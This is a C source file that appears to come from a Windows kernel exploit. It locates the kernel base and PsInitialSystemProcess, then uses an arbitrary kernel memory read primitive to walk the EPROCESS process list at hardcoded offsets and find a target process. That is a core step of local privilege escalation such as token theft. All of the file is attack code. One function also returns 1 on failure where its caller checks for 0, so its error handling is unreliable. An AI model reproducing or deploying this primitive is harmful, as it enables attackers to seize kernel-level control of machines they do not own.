#include <Ntdefs.h>
#include <Psapi.h>
#include <Utils.h>
#include <Sf.h>

DWORD NTAPI
TpwResolveInitialSystemProcessOffset(
    VOID
) {
    HMODULE KernelModule = LoadLibraryA("ntoskrnl.exe");

    if (KernelModule == NULL)
        return 0;
    
    ULONG_PTR PsInitialSystemProcessOffset =
        (ULONG_PTR)GetProcAddress(
            KernelModule,
            "PsInitialSystemProcess"
        );

    if (PsInitialSystemProcessOffset == 0)
        return 0;

    return (PsInitialSystemProcessOffset - (ULONG_PTR)KernelModule);
}

ULONGLONG NTAPI
TpwResolveKernelBaseAddress(
    VOID
) {
    ULONGLONG           DriverBases[1024];
    DWORD               BytesNeeded;

    if (EnumDeviceDrivers((LPVOID*)DriverBases, sizeof(DriverBases), &BytesNeeded) == FALSE)
        return 0;

    return (ULONGLONG)DriverBases[0];
}

ULONGLONG NTAPI
TpwResolveSystemProcessBase(
    VOID
) {
    DWORD PsInitialSystemProcessOffset = TpwResolveInitialSystemProcessOffset();
    if (PsInitialSystemProcessOffset == 0)
        return 1;

    ULONGLONG KernelBase = TpwResolveKernelBaseAddress();
    if (KernelBase == 0)
        return 1;

    ULONGLONG BaseAddress = 0;
    BOOLEAN Result = TpwArbitaryReadQword(
        TpwTranslateVirtual(KernelBase + PsInitialSystemProcessOffset),
        &BaseAddress
    );

    if (Result == FALSE)
        return 0;

    return BaseAddress;
}

ULONGLONG NTAPI
TpwGetEprocessFromPid(
    _In_ DWORD          TargetPid
) {
    // Extremely slow, might take 2 minutes or more to complete

    ULONGLONG           ListEntry = 0;
    ULONGLONG           Current;

    
    ULONGLONG SystemEprocess = TpwResolveSystemProcessBase();
    if (SystemEprocess == 0)
        return 0;

    ULONGLONG ListHead = SystemEprocess + 0x1D8;

    if (TpwArbitaryReadQword(TpwTranslateVirtual(ListHead), &ListEntry) == FALSE)
        return 0;

    Current = SystemEprocess;

    do {
        ULONGLONG UniqueProcessId = 0;
        if (TpwArbitaryReadQword(TpwTranslateVirtual(Current + 0x1D0), &UniqueProcessId) == FALSE)
            return 0;

        if ((DWORD)UniqueProcessId == TargetPid)
            return Current;

        ULONGLONG NextListEntry = 0;
        if (TpwArbitaryReadQword(TpwTranslateVirtual(Current + 0x1D8), &NextListEntry) == FALSE)
            return 0;

        Current = NextListEntry - 0x1D8;

    } while (Current != SystemEprocess);

    return 0;
}
